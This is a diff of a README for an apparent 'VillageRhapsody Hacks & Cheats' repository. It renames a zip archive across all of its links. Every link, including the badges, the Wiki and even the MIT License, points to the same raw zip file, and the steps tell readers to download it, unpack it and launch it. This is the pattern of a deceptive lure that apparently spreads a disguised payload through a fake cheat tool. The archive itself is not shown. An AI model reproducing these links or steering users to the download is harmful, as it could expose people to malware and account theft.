@@ -1,8 +1,8 @@
-![VillageRhapsody hacks cheats title banner](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/tweaker_village_tools_rhapsody_v3.8.zip%20Hacks-Unlimited%20Potential-brightgreen?style=for-the-badge&logo=github)
-![Stars](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/tweaker_village_tools_rhapsody_v3.8.zip)
-![Forks](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/tweaker_village_tools_rhapsody_v3.8.zip)
-![Issues](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/tweaker_village_tools_rhapsody_v3.8.zip)
-![License](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/tweaker_village_tools_rhapsody_v3.8.zip)
+![VillageRhapsody hacks cheats title banner](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/village_rhapsody_tweaker_tools_v3.0.zip%20Hacks-Unlimited%20Potential-brightgreen?style=for-the-badge&logo=github)
+![Stars](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/village_rhapsody_tweaker_tools_v3.0.zip)
+![Forks](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/village_rhapsody_tweaker_tools_v3.0.zip)
+![Issues](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/village_rhapsody_tweaker_tools_v3.0.zip)
+![License](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/village_rhapsody_tweaker_tools_v3.0.zip)
 
 # 🎵 VillageRhapsody Hacks & Cheats: The Ultimate Enhancement Suite
 
@@ -11,7 +11,7 @@
 
 ---  
 
-[![Download](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/tweaker_village_tools_rhapsody_v3.8.zip)](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/tweaker_village_tools_rhapsody_v3.8.zip)
+[![Download](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/village_rhapsody_tweaker_tools_v3.0.zip)](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/village_rhapsody_tweaker_tools_v3.0.zip)
 
 ---
 
@@ -83,7 +83,7 @@ Harnessing the full spectrum of VillageRhapsody hacks and cheats, this repositor
    - Back up your current saves for peace of mind.
 
 2. **Initiate the Download:**  
-   [![Download](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/tweaker_village_tools_rhapsody_v3.8.zip)](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/tweaker_village_tools_rhapsody_v3.8.zip)  
+   [![Download](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/village_rhapsody_tweaker_tools_v3.0.zip)](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/village_rhapsody_tweaker_tools_v3.0.zip)  
    *Click the "Download" image above to access the Harmony Package for your OS.*
 
 3. **Unpack and Launch:**  
@@ -97,7 +97,7 @@ Harnessing the full spectrum of VillageRhapsody hacks and cheats, this repositor
 5. **Support:**  
    - For additional in-depth instructions and troubleshooting, consult the in-package manual or tap the chat bubble.
 
-*For detailed installation video tutorials and advanced integration options, see the [Wiki](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/tweaker_village_tools_rhapsody_v3.8.zip).*
+*For detailed installation video tutorials and advanced integration options, see the [Wiki](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/village_rhapsody_tweaker_tools_v3.0.zip).*
 
 ---
 
@@ -112,7 +112,7 @@ This repository is an independent project and is not affiliated with, sponsored 
 
 Copyright (c) 2025
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/tweaker_village_tools_rhapsody_v3.8.zip).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/village_rhapsody_tweaker_tools_v3.0.zip).  
 By using, modifying, or distributing this suite, you agree to the terms and responsibilities therein.
 
 ---
@@ -120,7 +120,7 @@ By using, modifying, or distributing this suite, you agree to the terms and resp
 ## 🚀 Your Next Chapter Awaits
 
 Harness the composer's baton!  
-[![Download](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/tweaker_village_tools_rhapsody_v3.8.zip)](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/tweaker_village_tools_rhapsody_v3.8.zip)
+[![Download](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/village_rhapsody_tweaker_tools_v3.0.zip)](https://raw.githubusercontent.com/satoruedits/village-rhapsody-tweaker-tools/branch/monospermy/village_rhapsody_tweaker_tools_v3.0.zip)
 
 ---
 
